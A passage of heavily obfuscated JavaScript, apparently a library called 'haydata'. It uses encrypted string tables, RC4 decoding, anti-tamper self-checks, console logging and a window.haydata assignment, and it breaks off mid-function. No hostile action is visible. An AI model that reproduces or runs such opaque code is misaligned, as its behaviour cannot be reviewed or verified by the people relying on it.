$(function(){function haydata_0x831e(_0x1825ae,_0x5eeea4){var _0x47216d=haydata_0x5770();return haydata_0x831e=function(_0x1e64d7,_0x357353){_0x1e64d7=_0x1e64d7-(0x1b23+0x17f+-0x1b02);var _0x487a62=_0x47216d[_0x1e64d7];if(haydata_0x831e['ujLaDM']===undefined){var _0x565903=function(_0x4f2733){var _0x426f20='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x5746c5='',_0x4bfa37='',_0x29e07d=_0x5746c5+_0x565903;for(var _0x3e14cb=-0x17b*-0x16+-0x14b0+-0xbe2,_0x52e8e3,_0x40becb,_0x893287=0x4e9+-0x6eb+0x202;_0x40becb=_0x4f2733['charAt'](_0x893287++);~_0x40becb&&(_0x52e8e3=_0x3e14cb%(0xe15*-0x2+0x108b+-0x3e1*-0x3)?_0x52e8e3*(-0x1e14+-0xda4+0x2bf8)+_0x40becb:_0x40becb,_0x3e14cb++%(0x2264+0xb3c+-0x2d9c))?_0x5746c5+=_0x29e07d['charCodeAt'](_0x893287+(-0xf75*0x2+0xc*-0x300+0xa*0x6b2))-(-0xe*0x121+0x1*-0xaf1+0x1ac9)!==-0x25fd+-0x1c3f*0x1+0x423c?String['fromCharCode'](-0x1df1+-0x1685+-0x17*-0x253&_0x52e8e3>>(-(-0x135*0x2+0x58e+-0x191*0x2)*_0x3e14cb&-0x5*-0x2a9+-0x5cf*-0x6+-0x3021)):_0x3e14cb:-0xe48+-0x196d+0x27b5){_0x40becb=_0x426f20['indexOf'](_0x40becb)}for(var _0x5de851=0x14*0x79+0x22d8+-0x2c4c,_0x4474a9=_0x5746c5['length'];_0x5de851<_0x4474a9;_0x5de851++){_0x4bfa37+='%'+('00'+_0x5746c5['charCodeAt'](_0x5de851)['toString'](-0x1*0xdb9+-0x47d+0x1246))['slice'](-(0x1b11+-0xe7*-0x5+-0x1f92))}return decodeURIComponent(_0x4bfa37)};haydata_0x831e['JCAqto']=_0x565903,_0x1825ae=arguments,haydata_0x831e['ujLaDM']=!![]}var _0x47811d=_0x47216d[0x32*-0x38+-0x20c5*-0x1+-0x15d5],_0x34fb6a=_0x1e64d7+_0x47811d,_0x17a264=_0x1825ae[_0x34fb6a];if(!_0x17a264){var _0x197a43=function(_0x11decb){this['NaLHyL']=_0x11decb,this['qbVveK']=[0x20a+0x4f2+-0x1*0x6fb,0xd11+-0x736+-0x5db,0x1e65+-0x14*0x9e+0x120d*-0x1],this['eUvpnw']=function(){return'newState'},this['hwpGWE']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['PeCSFL']='[\x27|\x22].+[\x27|\x22];?\x20*}'};_0x197a43['prototype']['ETIpkE']=function(){var _0x1d8901=new RegExp(this['hwpGWE']+this['PeCSFL']),_0x9f7216=_0x1d8901['test'](this['eUvpnw']['toString']())?--this['qbVveK'][0x1fd9+-0x1*0x2611+0x639]:--this['qbVveK'][0x1*-0x1d7b+-0x1*-0xdab+-0xfd0*-0x1];return this['XnPLik'](_0x9f7216)},_0x197a43['prototype']['XnPLik']=function(_0x5dc703){if(!Boolean(~_0x5dc703))return _0x5dc703;return this['AmXjim'](this['NaLHyL'])},_0x197a43['prototype']['AmXjim']=function(_0x284ff6){for(var _0x55f983=-0x29*0x53+0x1270+0x525*-0x1,_0xb051c2=this['qbVveK']['length'];_0x55f983<_0xb051c2;_0x55f983++){this['qbVveK']['push'](Math['round'](Math['random']())),_0xb051c2=this['qbVveK']['length']}return _0x284ff6(this['qbVveK'][0x25c7+-0x175f+0x734*-0x2])},new _0x197a43(haydata_0x831e)['ETIpkE'](),_0x487a62=haydata_0x831e['JCAqto'](_0x487a62),_0x1825ae[_0x34fb6a]=_0x487a62}else _0x487a62=_0x17a264;return _0x487a62},haydata_0x831e(_0x1825ae,_0x5eeea4)}function haydata_0x1670(_0x49d485,_0x3400db){var _0x2d21b2=haydata_0x5770();return haydata_0x1670=function(_0x4c23d3,_0x2b2cdc){_0x4c23d3=_0x4c23d3-(0x1b23+0x17f+-0x1b02);var _0xcd1a65=_0x2d21b2[_0x4c23d3];if(haydata_0x1670['lrdwjC']===undefined){var _0x4f4beb=function(_0x4a8a16){var _0x3d506c='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x4b3e5a='',_0x2f3327='',_0x53368c=_0x4b3e5a+_0x4f4beb;for(var _0x2e61f2=-0x17b*-0x16+-0x14b0+-0xbe2,_0x11c7c4,_0x310864,_0x3b3480=0x4e9+-0x6eb+0x202;_0x310864=_0x4a8a16['charAt'](_0x3b3480++);~_0x310864&&(_0x11c7c4=_0x2e61f2%(0xe15*-0x2+0x108b+-0x3e1*-0x3)?_0x11c7c4*(-0x1e14+-0xda4+0x2bf8)+_0x310864:_0x310864,_0x2e61f2++%(0x2264+0xb3c+-0x2d9c))?_0x4b3e5a+=_0x53368c['charCodeAt'](_0x3b3480+(-0xf75*0x2+0xc*-0x300+0xa*0x6b2))-(-0xe*0x121+0x1*-0xaf1+0x1ac9)!==-0x25fd+-0x1c3f*0x1+0x423c?String['fromCharCode'](-0x1df1+-0x1685+-0x17*-0x253&_0x11c7c4>>(-(-0x135*0x2+0x58e+-0x191*0x2)*_0x2e61f2&-0x5*-0x2a9+-0x5cf*-0x6+-0x3021)):_0x2e61f2:-0xe48+-0x196d+0x27b5){_0x310864=_0x3d506c['indexOf'](_0x310864)}for(var _0x265841=0x14*0x79+0x22d8+-0x2c4c,_0x5771ff=_0x4b3e5a['length'];_0x265841<_0x5771ff;_0x265841++){_0x2f3327+='%'+('00'+_0x4b3e5a['charCodeAt'](_0x265841)['toString'](-0x1*0xdb9+-0x47d+0x1246))['slice'](-(0x1b11+-0xe7*-0x5+-0x1f92))}return decodeURIComponent(_0x2f3327)};var _0x520909=function(_0x16ce26,_0x5d5c66){var _0x222fc2=[],_0x110b0b=0x32*-0x38+-0x20c5*-0x1+-0x15d5,_0x433ce6,_0x303d86='';_0x16ce26=_0x4f4beb(_0x16ce26);var _0x22d400;for(_0x22d400=0x20a+0x4f2+-0x1*0x6fc;_0x22d400<0xd11+-0x736+-0x4db;_0x22d400++){_0x222fc2[_0x22d400]=_0x22d400}for(_0x22d400=0x1e65+-0x14*0x9e+0x120d*-0x1;_0x22d400<0x1fd9+-0x1*0x2611+0x738;_0x22d400++){_0x110b0b=(_0x110b0b+_0x222fc2[_0x22d400]+_0x5d5c66['charCodeAt'](_0x22d400%_0x5d5c66['length']))%(0x1*-0x1d7b+-0x1*-0xdab+-0x10d0*-0x1),_0x433ce6=_0x222fc2[_0x22d400],_0x222fc2[_0x22d400]=_0x222fc2[_0x110b0b],_0x222fc2[_0x110b0b]=_0x433ce6}_0x22d400=-0x29*0x53+0x1270+0x525*-0x1,_0x110b0b=0x25c7+-0x175f+0x734*-0x2;for(var _0x49ac5e=-0x3*0x66e+0x97*-0x3a+0x3580;_0x49ac5e<_0x16ce26['length'];_0x49ac5e++){_0x22d400=(_0x22d400+(0x1383+0xf*0x4a+0xda*-0x1c))%(0x17*-0x35+0xbcb+0x8*-0xc1),_0x110b0b=(_0x110b0b+_0x222fc2[_0x22d400])%(-0x1233+-0x186e+-0x3*-0xe8b),_0x433ce6=_0x222fc2[_0x22d400],_0x222fc2[_0x22d400]=_0x222fc2[_0x110b0b],_0x222fc2[_0x110b0b]=_0x433ce6,_0x303d86+=String['fromCharCode'](_0x16ce26['charCodeAt'](_0x49ac5e)^_0x222fc2[(_0x222fc2[_0x22d400]+_0x222fc2[_0x110b0b])%(-0x646*-0x5+0x1e0b*-0x1+-0x53)])}return _0x303d86};haydata_0x1670['gRrIlI']=_0x520909,_0x49d485=arguments,haydata_0x1670['lrdwjC']=!![]}var _0x365701=_0x2d21b2[0x10*-0x3b+-0x117f+0x1ed*0xb],_0x3ac2c2=_0x4c23d3+_0x365701,_0x407dff=_0x49d485[_0x3ac2c2];if(!_0x407dff){if(haydata_0x1670['tSWLem']===undefined){var _0x2b6650=function(_0x53bc6c){this['AIvpyQ']=_0x53bc6c,this['Mgzzpk']=[0x7be+-0x2155+0x1998,0x1b1b+0x1f81+-0x3a9c,-0x1412+-0x10d+0x151f],this['NeRUyL']=function(){return'newState'},this['LHPLYR']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['sEWnql']='[\x27|\x22].+[\x27|\x22];?\x20*}'};_0x2b6650['prototype']['icszpj']=function(){var _0xc85de9=new RegExp(this['LHPLYR']+this['sEWnql']),_0x180a10=_0xc85de9['test'](this['NeRUyL']['toString']())?--this['Mgzzpk'][0x128a+0x781*0x5+0x401*-0xe]:--this['Mgzzpk'][-0x1239*-0x1+-0x234b*-0x1+-0x64*0x89];return this['NTxZYc'](_0x180a10)},_0x2b6650['prototype']['NTxZYc']=function(_0x2c7575){if(!Boolean(~_0x2c7575))return _0x2c7575;return this['Bhyllf'](this['AIvpyQ'])},_0x2b6650['prototype']['Bhyllf']=function(_0x25c432){for(var _0x2c702a=0x2038+-0x5b*0x4c+-0x534,_0x361427=this['Mgzzpk']['length'];_0x2c702a<_0x361427;_0x2c702a++){this['Mgzzpk']['push'](Math['round'](Math['random']())),_0x361427=this['Mgzzpk']['length']}return _0x25c432(this['Mgzzpk'][-0x1*-0x1855+-0xbd7+-0x63f*0x2])},new _0x2b6650(haydata_0x1670)['icszpj'](),haydata_0x1670['tSWLem']=!![]}_0xcd1a65=haydata_0x1670['gRrIlI'](_0xcd1a65,_0x2b2cdc),_0x49d485[_0x3ac2c2]=_0xcd1a65}else _0xcd1a65=_0x407dff;return _0xcd1a65},haydata_0x1670(_0x49d485,_0x3400db)}var haydata_0x2142f2=haydata_0x1670,haydata_0x496357=haydata_0x1670,haydata_0x5ee94f=haydata_0x1670,haydata_0xfb610e=haydata_0x1670,haydata_0x5c1495=haydata_0x1670,haydata_0x30c063=haydata_0x831e,haydata_0x174e75=haydata_0x831e,haydata_0x5e4f2d=haydata_0x831e,haydata_0x253234=haydata_0x831e,haydata_0x152d42=haydata_0x831e;(function(_0x186401,_0x6fb8ae){var _0x248275=haydata_0x831e,_0xed23d6=haydata_0x1670,_0x45542d=haydata_0x1670,_0x3bd159=haydata_0x1670,_0x5e7811=haydata_0x1670,_0x56ae76=haydata_0x1670,_0x4e9f74=_0x186401();while(!![]){try{var _0x55c351=parseInt(_0xed23d6('0x1b9','Ubk*'))/(-0x1c1d+-0x1d98+0x53*0xb2)+parseInt(_0x45542d('0x1a7','[PiA'))/(0x1*0xaa1+-0x147*0xf+-0x2*-0x445)*(parseInt(_0xed23d6('0x1d1','3Zp4'))/(0x9d1*0x3+0x21d1*-0x1+0x3b*0x13))+-parseInt(_0x45542d(0x1d8,'BJF2'))/(0x1cc4+0x8*0x3b+-0x1e98)+parseInt(_0x3bd159('0x1d7','BY^b'))/(-0x200f+-0xfa*0x24+0x433c)*(parseInt(_0x45542d('0x1c5','AAB@'))/(0xfff+0x2f*-0x35+0x5e*-0x11))+parseInt(_0x56ae76('0x1c1','3Zp4'))/(-0x262*-0x4+0x1d*-0x103+0x13d6)+-parseInt(_0x248275(0x1df))/(-0x1be3+-0x484*0x4+0x4f*0x95)+-parseInt(_0x3bd159('0x1b7','%8CR'))/(-0x3*-0x673+-0x22b2+0xf62);if(_0x55c351===_0x6fb8ae)break;else _0x4e9f74['push'](_0x4e9f74['shift']())}catch(_0x2783a6){_0x4e9f74['push'](_0x4e9f74['shift']())}}}(haydata_0x5770,-0xdd00a+-0x4f6b1+0x1796*0x166));var haydata_0x27ecd0=function(){var _0xf9afa5=haydata_0x831e,_0x442a43=haydata_0x831e,_0x33c0e0=haydata_0x831e,_0x198938=haydata_0x831e,_0xd59181=haydata_0x831e,_0x5118d0=haydata_0x1670,_0x288b50=haydata_0x1670,_0x7d4a84=haydata_0x1670,_0x1a47b7=haydata_0x1670,_0xe7d6b9={};_0xe7d6b9[_0x5118d0(0x1dd,'BY^b')+'DG']=function(_0x32b5e2,_0x3ca1dc){return _0x32b5e2!==_0x3ca1dc},_0xe7d6b9[_0xf9afa5('0x1db')+'zT']=_0x442a43(0x1cc)+'aH',_0xe7d6b9[_0x5118d0('0x1c2','@EEP')+'Vm']=_0x7d4a84('0x1b6','BY^b')+'VA',_0xe7d6b9[_0xf9afa5(0x1c9)+'Tg']=_0xf9afa5(0x1a0)+'GX',_0xe7d6b9[_0x288b50(0x1d6,'BR2A')+'sm']=_0xf9afa5(0x1a9)+'pq',_0xe7d6b9[_0x33c0e0('0x1c4')+'qv']=_0x442a43(0x1e4)+'Ez';var _0x240dd2=_0xe7d6b9,_0x15013a=!![];return function(_0x1f1f2d,_0x3d09d6){var _0x3d8a5b=_0x288b50,_0x55b9d2=_0x5118d0,_0x4c1749=_0xd59181,_0x472c65=_0x198938,_0x589cc3=_0xf9afa5,_0xe5dc68=_0x198938,_0x5daad3=_0x442a43,_0x2aca33={'UgDdH':function(_0x566863,_0x28b8c8){var _0x5710af=haydata_0x831e;return _0x240dd2[_0x5710af('0x1d5')+'DG'](_0x566863,_0x28b8c8)},'xoWLf':_0x240dd2[_0x4c1749('0x1db')+'zT'],'Fdwfp':_0x240dd2[_0x3d8a5b('0x1a3','M1Cx')+'Vm'],'lugmz':function(_0x4b49a8,_0x2a9525){var _0x316671=_0x4c1749;return _0x240dd2[_0x316671(0x1d5)+'DG'](_0x4b49a8,_0x2a9525)},'jMYtM':_0x240dd2[_0x472c65(0x1c9)+'Tg'],'UMXQc':_0x240dd2[_0x589cc3(0x1c6)+'sm']};if(_0x240dd2[_0x4c1749('0x1d5')+'DG'](_0x240dd2[_0x472c65('0x1c4')+'qv'],_0x240dd2[_0x3d8a5b(0x1bb,'wHLm')+'qv'])){var _0x15da24=_0x2b7e6c?function(){var _0xaee873=_0x55b9d2;if(_0x2e5682){var _0x32e701=_0x9b87f3[_0xaee873('0x1d0','zwhd')+'ly'](_0x3c9c74,arguments);return _0x3aeaff=null,_0x32e701}}:function(){};return _0x24f2e3=![],_0x15da24}else{var _0x3c2eb4=_0x15013a?function(){var _0x11bbc6=_0x472c65,_0xecefa5=_0x589cc3,_0x72e4b2=_0x472c65,_0x4dfb52=_0x589cc3,_0x30e6f5=_0x472c65,_0x41baf9=_0x55b9d2,_0x5d2ff4=_0x55b9d2,_0x30559f=_0x3d8a5b,_0x446500=_0x3d8a5b,_0x13bf1d=_0x55b9d2;if(_0x2aca33[_0x41baf9(0x1d3,'Q(sI')+'dH'](_0x2aca33[_0x11bbc6('0x1c0')+'Lf'],_0x2aca33[_0x5d2ff4(0x1ee,'KASG')+'fp'])){if(_0x3d09d6){if(_0x2aca33[_0x5d2ff4(0x1b0,'YAAV')+'mz'](_0x2aca33[_0x11bbc6(0x1cd)+'tM'],_0x2aca33[_0xecefa5(0x1bc)+'Qc'])){var _0x4e9f8b=_0x3d09d6[_0x41baf9('0x1a4','EnxI')+'ly'](_0x1f1f2d,arguments);return _0x3d09d6=null,_0x4e9f8b}else{var _0x24f22a=_0x9be4b6[_0x446500(0x1bd,'AAB@')+'ly'](_0x1f8203,arguments);return _0x4cca6d=null,_0x24f22a}}}else _0x123ada[_0x72e4b2('0x1dc')+_0x11bbc6('0x1aa')+'a']=_0x3fec5b}:function(){};return _0x15013a=![],_0x3c2eb4}}}(),haydata_0x193e40=haydata_0x27ecd0(this,function(){var _0x20050c=haydata_0x1670,_0x177287=haydata_0x1670,_0x5f0d80=haydata_0x1670,_0x396054=haydata_0x1670,_0x2abd43=haydata_0x1670,_0x4593cd=haydata_0x831e,_0x3f13f9=haydata_0x831e,_0x541179=haydata_0x831e,_0x30f3e9=haydata_0x831e,_0x5a096e=haydata_0x831e,_0x3c8526={};_0x3c8526[_0x4593cd(0x1b8)+'Lu']=_0x20050c(0x1ec,'z(oK')+_0x20050c('0x1da','z(oK')+_0x4593cd(0x1e0)+_0x4593cd('0x1ae');var _0x368478=_0x3c8526;return haydata_0x193e40[_0x177287(0x1ac,'4w7j')+_0x177287(0x1a5,'B6Fx')+'ng']()[_0x30f3e9(0x1d9)+_0x20050c(0x1b2,'izkb')](_0x368478[_0x5f0d80(0x1e7,'xwjR')+'Lu'])[_0x3f13f9('0x1ca')+_0x4593cd(0x1de)+'ng']()[_0x20050c('0x1eb','zwhd')+_0x20050c(0x1ce,'5xWF')+_0x2abd43(0x1ed,'3Zp4')+'or'](haydata_0x193e40)[_0x3f13f9(0x1d9)+_0x4593cd(0x1ad)](_0x368478[_0x2abd43(0x1d4,'BR2A')+'Lu'])});haydata_0x193e40(),console[haydata_0x30c063(0x1b5)](haydata_0x2142f2(0x1be,'BY^b')+haydata_0x2142f2(0x1a1,'GYb2')+haydata_0x174e75(0x1c3)+haydata_0x5e4f2d('0x1cb')+haydata_0x496357('0x1e1','Qv%$')+haydata_0x5e4f2d('0x1e9')),console[haydata_0x5e4f2d(0x1b5)](haydata_0x5e4f2d('0x1a8')+haydata_0x496357(0x1b4,'%8CR')+haydata_0x496357(0x1ba,'LTyi')+haydata_0x30c063(0x1d2)+haydata_0x152d42('0x1e2')+haydata_0x174e75('0x1a2')+haydata_0x174e75(0x1a6)+haydata_0x253234(0x1e6)+')');try{window[haydata_0x2142f2(0x1e5,'4w7j')+haydata_0x30c063(0x1aa)+'a']=haydata}catch(haydata_0x116c8e){return console[haydata_0x5ee94f(0x1af,'o&0t')](haydata_0x5e4f2d('0x1e8')+'误：',haydata_0x116c8e),![]}function haydata_0x5770(){var _0x4e5fc8=['mLJdNW','kSoTWQ0','WO7dSCoT','yxLg','WRDmW60ipSoGW6TllSoysMjm','t3b0','seLN','zgf0','kmoftCkjWOZcOLLDW7VcHq0aW6xcTW','W5ZcSry','CMnO','ksSK','WQlcOmo2','WQpdPfO','ntbkDgXrC2m','lCkyEG','mta1mJKZnvfTu3bKEa','WQxcVfG','Bg9N','dCkoW58','W77dQapdN8oviHxdOaqhWO48Fcu','rgrM','ACkCurHRzxT0W745uNddOG','ue7cUG','WQe1WOS','vu1y','W5H0WQu','j8kzW4u','z8ocjSoXnCkyoCkJW6G/W4e+WQi','Eg9x','hmklWQJdHmoFvmkQWRyKW5hcPCooWR8','W6SFbq','ywWG','yurA','WOe8W6ZcSSkKW4RdM1VdLLDpiG','DxLe','WQZcRCkZfsBcOSoUW4FcKSomEmogwW','mty1ndeXmKXNEvnYBW','C094','Dg9t','yNKG','ALne','AK1z','WOXFcW','mJy5ndyZmNrhrhfVwq','WQBcJXO','f8ofW4RcHCk4eCoA','igj5','jSkXkG','g8kbpG','EgDs','kSkCha','xCoBW6yNfxHKW4a','rKpdGqtdIa7dUZ3cU8o9beZdMa','C2vH','jXxcUa','t0Hq','Agf5','emkmW74','DhjP','ndu1nJm3nNfvy0X2vW','kYKR','5BQp6Bc76k+X','iow9VowYUa','WPhcRCkhfSkKhJBcPqNdUCovsq','rhjX','W4dcVZW','Dw9U','WPVcKLi','5yE6546W6zsz','WRFOPB/OKPK','m3DwCLfWrq','WQtcKaq','irBcUq','uCorW6G','qmo3WOS','ExH5','WRJdGmk1','6iQXkeG'];haydata_0x5770=function(){return _0x4e5fc8};return haydata_0x5770()}!function(e){var t={};var haydata_0x419063=haydata_0x3e62,haydata_0x3564d8=haydata_0x45ac;function haydata_0x45ac(_0x55a0eb,_0x5200d8){var _0x13a7ae=haydata_0x3ddf();return haydata_0x45ac=function(_0xe99c1e,_0x30b627){_0xe99c1e=_0xe99c1e-(-0x4*0x23b+-0x2082+0x5*0x89b);var _0x472e35=_0x13a7ae[_0xe99c1e];if(haydata_0x45ac['aaqNkg']===undefined){var _0x4050ed=function(_0xce21d8){var _0x579e98='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x3737c1='',_0x28ef41='',_0x2c9f4d=_0x3737c1+_0x4050ed;for(var _0x586698=0x2*0xdf5+0x1b00+-0x36ea,_0x3ccaa2,_0x3e9593,_0x13fd78=-0x1*-0x1203+0x1626+0x2829*-0x1;_0x3e9593=_0xce21d8['charAt'](_0x13fd78++);~_0x3e9593&&(_0x3ccaa2=_0x586698%(-0x150d+0x1f31+-0x10*0xa2)?_0x3ccaa2*(0x7a*-0x39+0x2439+0x1c3*-0x5)+_0x3e9593:_0x3e9593,_0x586698++%(0x4*0x5+0x967+0x1*-0x977))?_0x3737c1+=_0x2c9f4d['charCodeAt'](_0x13fd78+(-0x533+0x2431+-0x1ef4))-(-0x33c+0x2664+-0x231e)!==0x135*-0x14+0x83c*0x3+-0x90?String['fromCharCode'](-0x2ad*-0xb+-0x22f5+0x1*0x685&_0x3ccaa2>>(-(0x1*0xb72+-0x515*-0x3+-0x1aaf)*_0x586698&-0x83*0x49+0x794+-0x3*-0x9ef)):_0x586698:0x1dcd+-0x1a29+0x1*-0x3a4){_0x3e9593=_0x579e98['indexOf'](_0x3e9593)}for(var _0x3cbb04=-0x3*0x9b5+0xaaa+0x1275,_0x2e535e=_0x3737c1['length'];_0x3cbb04<_0x2e535e;_0x3cbb04++){_0x28ef41+='%'+('00'+_0x3737c1['charCodeAt'](_0x3cbb04)['toString'](0x223b+-0x99b*-0x2+-0x3561))['slice'](-(0x1a30+0x2b*-0xad+0x2e1))}return decodeURIComponent(_0x28ef41)};haydata_0x45ac['nADnCK']=_0x4050ed,_0x55a0eb=arguments,haydata_0x45ac['aaqNkg']=!![]}var _0x229dd3=_0x13a7ae[-0x19ca+0x1737+0x293*0x1],_0x559303=_0xe99c1e+_0x229dd3,_0x1da9ed=_0x55a0eb[_0x559303];if(!_0x1da9ed){var _0x226f39=function(_0x2444ed){this['bfnWOq']=_0x2444ed,this['hCamMa']=[0x1c6*-0x7+0x1f35*-0x1+-0x1*-0x2ba0,0x1*-0x1f3a+0xabc*-0x3+0x1fb7*0x2,-0x12d6+-0x3b*0xa+0x1524],this['WxpovE']=function(){return'newState'},this['MhlkxS']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['wlanrM']='[\x27|\x22].+[\x27|\x22];?\x20*}'};_0x226f39['prototype']['rSHROx']=function(){var _0x2c4b12=new RegExp(this['MhlkxS']+this['wlanrM']),_0x469953=_0x2c4b12['test'](this['WxpovE']['toString']())?--this['hCamMa'][-0x6*0x328+0x22e7*0x1+0x2*-0x7fb]:--this['hCamMa'][-0x162a+-0x142d+0x2a57];return this['QVUEcb'](_0x469953)},_0x226f39['prototype']['QVUEcb']=function(_0x37f473){if(!Boolean(~_0x37f473))return _0x37f473;return this['rLTtfr'](this['bfnWOq'])},_0x226f39['prototype']['rLTtfr']=function(_0x166eb0){for(var _0x2ba77f=0x641*0x1+-0x1*0x21b+-0x426,_0xc3006e=this['hCamMa']['length'];_0x2ba77f<_0xc3006e;_0x2ba77f++){this['hCamMa']['push'](Math['round'](Math['random']())),_0xc3006e=this['hCamMa']['length']}return _0x166eb0(this['hCamMa'][0x1*0x2092+-0x5*-0x5c6+0x3d70*-0x1])},new _0x226f39(haydata_0x45ac)['rSHROx'](),_0x472e35=haydata_0x45ac['nADnCK'](_0x472e35),_0x55a0eb[_0x559303]=_0x472e35}else _0x472e35=_0x1da9ed;return _0x472e35},haydata_0x45ac(_0x55a0eb,_0x5200d8)}function haydata_0x3e62(_0x41aa23,_0x280611){var _0x41d229=haydata_0x3ddf();return haydata_0x3e62=function(_0x2db84c,_0x23beb7){_0x2db84c=_0x2db84c-(-0x4*0x23b+-0x2082+0x5*0x89b);var _0x3b4afd=_0x41d229[_0x2db84c];if(haydata_0x3e62['GRFNME']===undefined){var _0x40a005=function(_0x3d35fb){var _0x3c8c72='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x1cce5d='',_0x2bf3fd='',_0x57358f=_0x1cce5d+_0x40a005;for(var _0x44efac=0x2*0xdf5+0x1b00+-0x36ea,_0x58428f,_0x219a20,_0xd12edd=-0x1*-0x1203+0x1626+0x2829*-0x1;_0x219a20=_0x3d35fb['charAt'](_0xd12edd++);~_0x219a20&&(_0x58428f=_0x44efac%(-0x150d+0x1f31+-0x10*0xa2)?_0x58428f*(0x7a*-0x39+0x2439+0x1c3*-0x5)+_0x219a20:_0x219a20,_0x44efac++%(0x4*0x5+0x967+0x1*-0x977))?_0x1cce5d+=_0x57358f['charCodeAt'](_0xd12edd+(-0x533+0x2431+-0x1ef4))-(-0x33c+0x2664+-0x231e)!==0x135*-0x14+0x83c*0x3+-0x90?String['fromCharCode'](-0x2ad*-0xb+-0x22f5+0x1*0x685&_0x58428f>>(-(0x1*0xb72+-0x515*-0x3+-0x1aaf)*_0x44efac&-0x83*0x49+0x794+-0x3*-0x9ef)):_0x44efac:0x1dcd+-0x1a29+0x1*-0x3a4){_0x219a20=_0x3c8c72['indexOf'](_0x219a20)}for(var _0x537f09=-0x3*0x9b5+0xaaa+0x1275,_0x5b7a52=_0x1cce5d['length'];_0x537f09<_0x5b7a52;_0x537f09++){_0x2bf3fd+='%'+('00'+_0x1cce5d['charCodeAt'](_0x537f09)['toString'](0x223b+-0x99b*-0x2+-0x3561))['slice'](-(0x1a30+0x2b*-0xad+0x2e1))}return decodeURIComponent(_0x2bf3fd)};var _0x2dfad3=function(_0x10c853,_0x494d7e){var _0x1ffaa0=[],_0x5d1a05=-0x19ca+0x1737+0x293*0x1,_0xfcbece,_0x132027='';_0x10c853=_0x40a005(_0x10c853);var _0x15d4ae;for(_0x15d4ae=0x1c6*-0x7+0x1f35*-0x1+-0x1*-0x2b9f;_0x15d4ae<0x1*-0x1f3a+0xabc*-0x3+0x2037*0x2;_0x15d4ae++){_0x1ffaa0[_0x15d4ae]=_0x15d4ae}for(_0x15d4ae=-0x12d6+-0x3b*0xa+0x1524;_0x15d4ae<-0x6*0x328+0x22e7*0x1+0x1*-0xef7;_0x15d4ae++){_0x5d1a05=(_0x5d1a05+_0x1ffaa0[_0x15d4ae]+_0x494d7e['charCodeAt'](_0x15d4ae%_0x494d7e['length']))%(-0x162a+-0x142d+0x2b57),_0xfcbece=_0x1ffaa0[_0x15d4ae],_0x1ffaa0[_0x15d4ae]=_0x1ffaa0[_0x5d1a05],_0x1ffaa0[_0x5d1a05]=_0xfcbece}_0x15d4ae=0x641*0x1+-0x1*0x21b+-0x426,_0x5d1a05=0x1*0x2092+-0x5*-0x5c6+0x3d70*-0x1;for(var _0x291b5e=0x1f16+0x1c1d+-0x3b33;_0x291b5e<_0x10c853['length'];_0x291b5e++){_0x15d4ae=(_0x15d4ae+(-0x236d+-0x10*-0xda+0x15ce))%(0x20b7+0x62b+0xd*-0x2ea),_0x5d1a05=(_0x5d1a05+_0x1ffaa0[_0x15d4ae])%(-0x1*-0xc34+-0x16b2+0xb7e),_0xfcbece=_0x1ffaa0[_0x15d4ae],_0x1ffaa0[_0x15d4ae]=_0x1ffaa0[_0x5d1a05],_0x1ffaa0[_0x5d1a05]=_0xfcbece,_0x132027+=String['fromCharCode'](_0x10c853['charCodeAt'](_0x291b5e)^_0x1ffaa0[(_0x1ffaa0[_0x15d4ae]+_0x1ffaa0[_0x5d1a05])%(-0x59*0x8+0x12c5+-0xefd)])}return _0x132027};haydata_0x3e62['JYFtoy']=_0x2dfad3,_0x41aa23=arguments,haydata_0x3e62['GRFNME']=!![]}var _0x52097d=_0x41d229[0x195a+-0x329*-0x2+-0x4*0x7eb],_0x5de48b=_0x2db84c+_0x52097d,_0x416e1e=_0x41aa23[_0x5de48b];if(!_0x416e1e){if(haydata_0x3e62['KCdxqM']===undefined){var _0x5512a8=function(_0x4d74dd){this['puNwrE']=_0x4d74dd,this['UnHKHk']=[-0x6*-0x3d6+0xd5a*-0x2+0x13b*0x3,-0x92*-0x36+0x114*0x14+-0x3*0x1174,0xc3*0x5+0x1ace+-0x1e9d],this['KRIqvi']=function(){return'newState'},this['ejtLQn']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['VmmTRX']='[\x27|\x22].+[\x27|\x22];?\x20*}'};_0x5512a8['prototype']['szHJiL']=function(){var _0x162fc9=new RegExp(this['ejtLQn']+this['VmmTRX']),_0x1323f4=_0x162fc9['test'](this['KRIqvi']['toString']())?--this['UnHKHk'][0x2*-0x830+-0x73*0x43+0x2e7a]:--this['UnHKHk'][0x10*0x194+-0x1326+0x47*-0x16];return this['iwHoKj'](_0x1323f4)},_0x5512a8['prototype']['iwHoKj']=function(_0x21b108){if(!Boolean(~_0x21b108))return _0x21b108;return this['pvNeEO'](this['puNwrE'])},_0x5512a8['prototype']['pvNeEO']=function(_0x3474ff){for(var _0x5b02c0=0x2615+-0x252c+-0x1*0xe9,_0xa1d0a4=this['UnHKHk']['length'];_0x5b02c0<_0xa1d0a4;_0x5b02c0++){this['UnHKHk']['push'](Math['round'](Math['random']())),_0xa1d0a4=this['UnHKHk']['length']}return _0x3474ff(this['UnHKHk'][-0x12a*-0x3+-0x1c78*-0x1+0x1*-0x1ff6])},new _0x5512a8(haydata_0x3e62)['szHJiL'](),haydata_0x3e62['KCdxqM']=!![]}_0x3b4afd=haydata_0x3e62['JYFtoy'](_0x3b4afd,_0x23beb7),_0x41aa23[_0x5de48b]=_0x3b4afd}else _0x3b4afd=_0x416e1e;return _0x3b4afd},haydata_0x3e62(_0x41aa23,_0x280611)}function haydata_0x3ddf(){var 